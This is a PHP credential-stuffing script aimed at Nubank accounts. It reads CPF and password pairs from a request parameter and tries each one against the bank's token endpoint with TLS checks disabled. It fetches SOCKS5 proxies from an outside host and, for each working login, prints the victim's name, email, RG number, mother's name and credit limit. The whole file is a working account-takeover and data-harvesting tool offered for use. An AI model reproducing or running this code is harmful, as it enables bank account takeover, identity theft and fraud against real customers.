<?php 
 
error_reporting(0); 
ini_set('max_execution_time',0); 
 
function dados($string, $start, $end, $num) { 
    $str = explode($start, $string); 
    $str = explode($end, $str[$num]); 
    return $str[0]; 
} 
function proxy(){ 
 $link = file_get_contents("https://rootcenter.pintoresdeletras.com.br/ProxyGG.php"); 
 $proxy = dados($link, '"Proxy" : "','"', 1); 
 return $proxy; 
} 
 
$proxy = proxy(); 
   $linha = $_GET["lista"]; 
 
$linha = $_GET["linha"];
$cpf = explode("|", $linha)[0];
$senha = explode("|", $linha)[1];
$ch = curl_init();  
        curl_setopt($ch, CURLOPT_URL, 'https://prod-global-auth.nubank.com.br/api/token');  
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");  
        curl_setopt($ch, CURLOPT_HEADER, 1);  
        curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(  
    'Host: prod-global-auth.nubank.com.br ',  
    'Connection: Keep-Alive',  
    'user-agent: Android/4.33.2-minApi21-20304 (8e2fc01979f3ced6; 6.0.1; samsung; SM-J500M)',  
    'Content-Type: application/json; charset=UTF-8',  
    'Cache-Control: no-cache'  
));  
        curl_setopt($ch, CURLOPT_POSTFIELDS, '{  
  "grant_type": "password",  
  "client_id": "legacy_client_id",  
  "client_secret": "legacy_client_secret",  
  "login": "'.$cpf.'",  
  "password": "'.$senha.'"  
}');  
        curl_setopt($ch, CURLOPT_POST, 1);  
       $resulta = curl_exec($ch); 

$token = dados($resulta, '"access_token":"','"', 1); 
$usertoken = dados($resulta, 'https://prod-s0-customers.nubank.com.br/api/customers/','"', 1); 
  $ch = curl_init();  
        curl_setopt($ch, CURLOPT_URL, "https://prod-s0-customers.nubank.com.br/api/customers/$usertoken");  
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
        curl_setopt($ch, CURLOPT_PROXY, $proxy); 
        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);  
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");  
        curl_setopt($ch, CURLOPT_HEADER, 1);  
        curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(  
    'Authorization: Bearer '.$token.' 
' 
));   
    $result = curl_exec($ch); 


$token2 = dados($resulta, '"access_token":"','"', 1); 
$usertoken2 = dados($resulta, 'https://prod-s0-credit-card-accounts.nubank.com.br/api/accounts/','"', 1); 
$ch = curl_init();  
        curl_setopt($ch, CURLOPT_URL, "https://prod-s0-credit-card-accounts.nubank.com.br/api/accounts/$usertoken2");  
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
        curl_setopt($ch, CURLOPT_PROXY, $proxy); 
        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);  
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");  
        curl_setopt($ch, CURLOPT_HEADER, 1);  
        curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(  
    'Authorization: Bearer '.$token2.' 
' 
));   
    $result2 = curl_exec($ch); 


if(strpos($result, 'email')){ 

$email = dados($result, '"email":"','"', 1); 
$nome = dados($result, '"name":"','"', 1); 
$rg = dados($result, '"rg","number":"','"', 1); 
$mae = dados($result, '"mothers_name":"','"', 1); 
$limit = dados($result2, '"precise_credit_limit":"','"', 1);

echo "LIVE → $cpf|$senha | Nome: $nome | RG: $rg | Nome da mãe: $mae | Email: $email | Limite da CC: $limit #FlashReverso"; 
 
}else{ 
 echo "DIE → $cpf|$senha"; 
} 
        ?>